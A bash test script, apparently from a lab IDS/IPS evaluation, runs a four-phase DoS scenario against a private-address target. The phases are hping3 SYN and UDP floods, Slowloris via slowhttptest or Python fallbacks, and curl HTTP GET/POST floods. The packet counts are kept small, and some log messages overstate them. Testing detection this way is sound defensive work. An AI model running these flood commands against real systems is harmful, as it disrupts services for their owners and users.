#!/bin/bash

# Scenario 03: DoS/DDoS Multi-Vector
# Mục tiêu  : Test phát hiện DoS ở nhiều layer (L4 SYN Flood, L4 UDP, L7 Slowloris)
# Công cụ   : hping3 (ưu tiên), fallback: python3 scripts
# Phases    : SYN Flood → UDP Flood → HTTP Slowloris → HTTP Flood


TARGET="${1:-172.16.1.2}"
LOG_DIR="${2:-/tmp/idps_test_logs}"
SCENARIO_NAME="03_dos"
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
TOOLS_DIR="$SCRIPT_DIR/tools"

mkdir -p "$LOG_DIR"
LOGFILE="$LOG_DIR/${SCENARIO_NAME}.log"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOGFILE"
}

# Kiểm tra tools
HAS_HPING3=false
HAS_SLOWHTTPTEST=false

command -v hping3 &>/dev/null && HAS_HPING3=true
command -v slowhttptest &>/dev/null && HAS_SLOWHTTPTEST=true


log "SCENARIO 03: DoS/DDoS Multi-Vector → $TARGET"
log "Tools: hping3=$HAS_HPING3, slowhttptest=$HAS_SLOWHTTPTEST"
log "Fallback: Python syn_flood + slowloris scripts"


# PHASE 1: Layer 4 — SYN Flood
# Mục đích: Gửi rất nhiều TCP SYN → server phải giữ half-open connections
# ML features: Flow Packets/s cực cao, SYN Flag Count >> bình thường

log "PHASE 1: Layer 4 — SYN Flood (30 giây)"

if $HAS_HPING3; then
    log "[1.1] hping3: SYN Flood port 80"
    log "      → Flow Bytes/s, Flow Packets/s tăng vọt"
    # Tối ưu hóa siêu nhẹ: gửi 20 packets trong 2 giây để tránh nghẽn backlog Server
    timeout 5 hping3 -S -c 20 -i u100000 -V -p 80 "$TARGET" \
        2>&1 | tail -3 | tee -a "$LOGFILE" &
    HPING_PID=$!
    sleep 5
    sudo pkill -9 "^hping3$" 2>/dev/null || true
    wait $HPING_PID 2>/dev/null

    bash "$SCRIPT_DIR/unblock_and_reset.sh"

    
    log "[1.2] hping3: SYN Flood port 443 (HTTPS)"
    # Gửi 10 packets
    timeout 5 hping3 -S -c 10 -i u100000 -p 443 "$TARGET" \
        2>&1 | tail -3 | tee -a "$LOGFILE" &
    HPING_PID=$!
    sleep 5
    sudo pkill -9 "^hping3$" 2>/dev/null || true
    wait $HPING_PID 2>/dev/null
else
    log "[1.1] Fallback: Python SYN Flood (socket connect flood)"
    log "      → hping3 không có, dùng python3 thay thế"
    python3 "$TOOLS_DIR/syn_flood_fallback.py" \
        --target "$TARGET" --port 80 --duration 5 --threads 5 \
        2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase1_syn.txt" | tail -5 | tee -a "$LOGFILE"
fi

bash "$SCRIPT_DIR/unblock_and_reset.sh"

# PHASE 2: Layer 4 — UDP Flood
# Mục đích: Flood UDP port 53 (DNS) → khác protocol vs Phase 1
# ML features: Protocol = UDP, Flow Packets/s cao

log "PHASE 2: Layer 4 — UDP Flood (20 giây)"

if $HAS_HPING3; then
    log "[2.1] hping3: UDP Flood port 53 (DNS)"
    log "      → Chứng minh ML phát hiện DoS bất kể protocol (TCP/UDP)"
    # Gửi 20 packets UDP
    timeout 5 hping3 --udp -p 53 -c 20 -i u100000 "$TARGET" \
        2>&1 | tail -3 | tee -a "$LOGFILE" &
    HPING_PID=$!
    sleep 5
    sudo pkill -9 "^hping3$" 2>/dev/null || true
    wait $HPING_PID 2>/dev/null
else
    log "[2.1] Fallback: Python UDP flood"
    python3 -c "
import socket, time, random
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
target = '$TARGET'
start = time.time()
count = 0
while time.time() - start < 5:
    try:
        s.sendto(bytes(random.getrandbits(8) for _ in range(512)), (target, 53))
        count += 1
        time.sleep(0.1)
    except: pass
print(f'Sent {count} UDP packets in 5s')
" 2>&1 | tee -a "$LOGFILE"
fi

bash "$SCRIPT_DIR/unblock_and_reset.sh"

# PHASE 3: Layer 7 — Slowloris (Application Layer DoS)
# Mục đích: Giữ kết nối HTTP mở → exhaust server connection pool
# ML features: Flow Duration cực dài, IAT Std bất thường
# Suricata: KHÔNG BẮT ĐƯỢC (không có signature cho slow connections)

log "PHASE 3: Layer 7 — Slowloris / Slow HTTP (45 giây)"

if $HAS_SLOWHTTPTEST; then
    log "[3.1] slowhttptest: Slowloris mode"
    log "      → Suricata MISS: không có signature cho slow HTTP"
    log "      → ML CATCH: Flow Duration bất thường, IAT pattern"
    # Giảm số connection xuống còn 10 và thời gian test 5s
    slowhttptest -c 10 -H -g -o "$LOG_DIR/${SCENARIO_NAME}_slowloris" \
        -i 10 -r 100 -t GET \
        -u "http://$TARGET" -x 24 -p 3 -l 5 \
        2>&1 | tail -10 | tee -a "$LOGFILE"
else
    log "[3.1] Fallback: Python Slowloris"
    log "      → slowhttptest không có, dùng python3 thay thế"
    python3 "$TOOLS_DIR/slowloris_fallback.py" \
        --target "$TARGET" --port 80 --connections 5 --duration 5 \
        2>&1 | tee "$LOG_DIR/${SCENARIO_NAME}_phase3_slowloris.txt" | tail -10 | tee -a "$LOGFILE"
fi

bash "$SCRIPT_DIR/unblock_and_reset.sh"

# PHASE 4: Layer 7 — HTTP Flood (nhiều request nhanh)
# Mục đích: Gửi nhiều HTTP GET/POST request → khác Slowloris (connection ngắn)
# Luôn hoạt động vì chỉ cần curl

log "PHASE 4: Layer 7 — HTTP Flood (200 requests)"

log "[4.1] HTTP GET Flood (100 requests, parallel)"
log "      → Mỗi request tạo 1 flow ngắn, tổng thể rất nhiều flows"
# Chỉ gửi 5 requests
for i in $(seq 1 5); do
    curl -s -o /dev/null -w "" -k "https://$TARGET/?flood=$i&t=$(date +%s%N)" &
done
wait
log "      → 5 GET requests hoàn tất"

bash "$SCRIPT_DIR/unblock_and_reset.sh"


log "[4.2] HTTP POST Flood (100 requests, large body)"
# Chỉ gửi 5 requests
for i in $(seq 1 5); do
    curl -s -o /dev/null -k -X POST \
        -d "data=$(head -c 1024 /dev/urandom | base64)" \
        "https://$TARGET/api/flood/$i" &
done
wait
log "      → 5 POST requests hoàn tất"



log "SCENARIO 03 HOÀN TẤT"
log "Logs: $LOG_DIR/${SCENARIO_NAME}_*.txt"
